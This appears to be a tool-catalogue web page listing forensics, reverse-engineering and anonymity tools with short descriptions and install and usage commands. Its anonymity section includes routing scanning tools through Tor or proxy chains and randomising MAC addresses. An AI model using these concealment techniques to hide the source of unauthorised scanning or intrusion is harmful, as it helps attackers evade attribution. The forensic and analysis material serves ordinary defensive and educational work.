RAM analysis: opens a memory dump and extracts the processes, network connections, and programs that were running at the time the image was taken — useful for detecting malware in memory.

pslist lists all processes that were running when the image was captured.

# Install
pip install volatility3
vol -f memory.dmp windows.pslist
Binwalk3
IntermediateLinuxAlternative: foremost

Analyzes firmware and binary files: locates compressed file systems or hidden files inside them and extracts them for later examination.

-e = extract all files found inside the firmware.

# Install
sudo apt install binwalk
binwalk -e firmware.bin
foremost4
BeginnerLinuxAlternative: Binwalk

Deleted file recovery tool: reads a disk image or file, searches for known file signatures (JPG, PDF, ZIP, etc.) and extracts them even when file-system metadata is missing.

-i input file, -o output folder, -t file type to recover.

# Install
sudo apt install foremost
# Recover files from a disk image
foremost -i disk.img -o output/
exiftool5
BeginnerMulti-platformAlternative: None

Metadata reader and editor: It extracts from images and documents the capture date, camera, location, author name, and editing tools. It is one of the most important tools for forensic analysis and examining suspicious files.

Change photo.jpg to the path of the file you want to scan.

# Install
sudo apt install libimage-exiftool-perl
# Show all metadata
exiftool photo.jpg
# Show only the important fields
exiftool -a -u -g1 photo.jpg
# Strip all metadata from a new copy
exiftool -all= -o clean.jpg photo.jpg
bulk_extractor6
IntermediateMulti-platformAlternative: Autopsy

A forensic analysis tool that extracts information from disk images and memory without booting the system: emails, links, card numbers, IP addresses, and embedded files. It even works on deleted portions of the disk.

-o output folder. Do not work on the original image; make a copy.

# Install
sudo apt install bulk-extractor
# Extract information from a disk image
bulk_extractor -o out image.dd
Sleuth Kit7
IntermediateLinux · macOSAlternative: Autopsy

A command-line toolkit for forensic analysis of file systems and images: listing partitions, extracting deleted files, and examining metadata.

Start with mmls to display the partitions and then fls for the file list.

#install
sudo apt install sleuthkit
# Show sections
mmls image.dd
# List of files
fls -r -p image.dd
# Extract file
icat image.dd 12345 > recovered.bin
Guymager8
BeginnerLinuxAlternative: foremost

Graphical interface for creating forensic disk images (dd/E01) with hash verification and process history.

Use read-only mode and make sure there is enough space.

#install
sudo apt install guymager
# Play
sudo guymager
Ghidra1
AdvancedMulti-platformAlternative: radare2

Reverse engineering with a graphical interface: load an executable, disassemble the instructions, and try to reconstruct more readable code (decompile) to understand how the program behaves without source code.

After running, create a new project and import the file you want to analyze.

# Install
sudo apt install ghidra
ghidra
radare22
AdvancedMulti-platformAlternative: Ghidra

Reverse engineering from the command line: Open the executable file, analyze it, and view instructions and functions from the terminal — lighter and faster for those who prefer commands over the interface.

-A lets the tool automatically analyze the file as soon as you open it.

# Install
sudo apt install radare2
r2 -A binary_file
GDB3
IntermediateLinuxAlternative: radare2

Debugger and execution analyzer: runs the program step by step, stops at breakpoints, and examines memory and registers — essential for understanding behavior and discovering vulnerabilities.

run to run, break to set a breakpoint, next and step to navigate, and info registers to show register values.

# Install
sudo apt install gdb
# Analyse an executable file
gdb ./binary
(gdb) break main
(gdb) run
strings4
BeginnerMulti-platformAlternative: None

Extracts readable text from any binary file: paths, error messages, keys, URLs, or function names. The first command to run on a suspicious executable file before opening it in Ghidra or GDB.

Use -n to specify the minimum length of the extracted text.

# Extract strings from an executable file
strings suspicious.bin
# Strings of 6 characters or more only
strings -n 6 suspicious.bin
# With each string's offset inside the file
strings -t x suspicious.bin
Cutter5
IntermediateMulti-platformAlternative: Ghidra

A graphical interface on top of the radare2 engine: displays disassembly code, function graphs, and charts, and allows easy navigation between functions. Suitable for learning before moving to Ghidra.

Open an executable file from the menu or from the terminal.

# Install
sudo apt install cutter
# Start the interface
cutter
objdump6
IntermediateLinuxAlternative: radare2

A binutils tool for displaying executable headers, sections, and disassembly, with options for code analysis.

Use -d to disassemble and -x to display headers.

#install
sudo apt install binutils
# Display headers
objdump -x program
# Disassemble the code
objdump -d -M intel program
strace7
IntermediateLinuxAlternative: GDB

Traces system calls and signals used by a program to uncover hidden files, network activity, and behavior.

Use -f to follow subprocesses and -e to restrict the trace to specific calls.

#install
sudo apt install strace
# Program tracking
strace./program
# Network tracking only
strace -f -e trace=network ./program
proxychains1
IntermediateLinuxAlternative: tor

Runs any tool through a chain of proxies: all traffic travels through multiple hops instead of a single direct path. Use it to route scanning tools through Tor or an authorized internal proxy.

Edit /etc/proxychains4.conf and add the proxy at the end of the file before running.

# Install
sudo apt install proxychains4
# Edit the proxy list
sudo nano /etc/proxychains4.conf
# Run any tool through the chain
proxychains4 curl https://ifconfig.me
tor2
BeginnerMulti-platformAlternative: proxychains

Anonymous routing network: It hides your real address from the websites you visit by routing the connection through three nodes. Useful for privacy and research, but not a substitute for encryption and it does not hide everything.

After running, you will have a local proxy at 127.0.0.1:9050.

# Install
sudo apt install tor
# Start the service
sudo systemctl start tor
# Verify the proxy is running
curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
macchanger3
BeginnerLinuxAlternative: iproute2

Network interface MAC address changer: displays the current address, generates a random one, or sets it manually. Used for privacy and network testing; it can easily restore the original address.

You must bring the interface down before changing it and bring it back up afterward.

# Install
sudo apt install macchanger
# Bring the card down and change the address
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up
torsocks4
BeginnerLinux · macOSAlternative: proxychains

A wrapper that routes applications' connections through Tor without modifying their settings, preventing direct connections.

Start the Tor service first, then prefix the command with torsocks.

#install
sudo apt install torsocks tor
# Run the Tor service
sudo systemctl start tor
# Route the command via Tor
torsocks curl https://check.torproject.org
AnonSurf5
IntermediateLinuxAlternative: tor

Routes all system traffic through Tor and changes DNS, with start, stop, and status commands.

Save your work before running, as some services may be interrupted.

#install
sudo apt install anonsurf
# Start routing via Tor
sudo anonsurf start
#Status
sudo anonsurf status
# off
sudo anonsurf stop
